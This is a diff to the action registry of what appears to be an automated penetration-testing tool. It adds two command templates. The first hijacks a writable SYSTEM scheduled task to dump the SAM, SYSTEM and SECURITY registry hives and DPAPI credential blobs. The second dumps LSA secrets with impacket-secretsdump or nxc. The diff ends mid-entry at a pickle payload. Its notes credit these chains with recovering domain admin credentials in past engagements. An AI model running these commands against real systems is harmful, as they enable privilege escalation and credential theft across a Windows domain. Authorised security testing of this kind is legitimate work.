@@ -455,6 +455,25 @@ ACTION_REGISTRY: dict[str, Action] = {
         note="Full DPAPI chain: user SID + password -> master key -> decrypt credential blobs. "
              "Shadow Supply: this chain yielded the Domain Admin password."),
 
+    "writable_scheduledtask_hijack": _a("writable_scheduledtask_hijack",
+        ["# A scheduled task runs as SYSTEM and its action script is writable by Users.",
+         "schtasks /query /fo LIST /v | findstr /i \"TaskName Run:As Task To Run\"  # confirm SYSTEM",
+         "# overwrite the action script with a SYSTEM payload, then trigger it on demand:",
+         "#   echo <payload> > C:\\<writable task script>.ps1",
+         "schtasks /run /tn <TaskName>",
+         "# payload: reg save HKLM\\SAM|SYSTEM|SECURITY + copy %APPDATA%\\Microsoft\\Credentials|Protect,",
+         "# then icacls the loot dir /grant Users:R so a low-priv shell can pull it."],
+        risk="propose", runnable=False, outputs="raw",
+        note="Writable SYSTEM scheduled-task script -> SYSTEM. Use it to dump the SAM/SYSTEM/"
+             "SECURITY hives and the user's DPAPI blobs for offline decryption."),
+    "lsa_secrets_dump": _a("lsa_secrets_dump",
+        ["# recover LSA secrets (incl. DefaultPassword / autologon) offline from the hives:",
+         "impacket-secretsdump -sam sam -system system -security security LOCAL",
+         "# live alternative with admin creds: nxc smb $IP -u <U> -p '<P>' --lsa"],
+        risk="propose", runnable=False, outputs="raw",
+        note="DefaultPassword is an LSA secret in the SECURITY hive; secretsdump LOCAL prints it. "
+             "Feed any recovered cred to the vault + spray (Double_Hellix: this was the domain cred)."),
+
     # --- AI advanced: pickle deserialization (self-learned from modules) ---
     "craft_pickle_sympify": _a("craft_pickle_sympify",
         ["python3 -c \"\n"
